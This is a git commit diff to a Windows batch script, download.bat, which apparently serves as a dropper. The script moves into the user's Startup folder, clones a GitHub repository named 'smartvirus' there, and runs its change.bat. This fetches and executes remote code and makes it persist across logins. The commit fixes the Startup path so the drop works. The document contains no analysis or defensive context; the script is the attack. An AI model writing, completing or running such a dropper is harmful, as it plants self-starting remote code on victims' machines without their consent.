7dbccbfcee56c901c619d878a442f006c38f3286
AlexisEpsi <152502075+AlexisEpsi@users.noreply.github.com>
2024-01-25 09:32:36 +0100

    Update download.bat

--- download.bat
+++ download.bat
@@ -1,4 +1,6 @@
-cd AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+setlocal enabledelayedexpansion
+set "goto=%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+cd %goto%
 git clone https://github.com/mattistjnn/smartvirus
 cd smartvirus
 Start change.bat
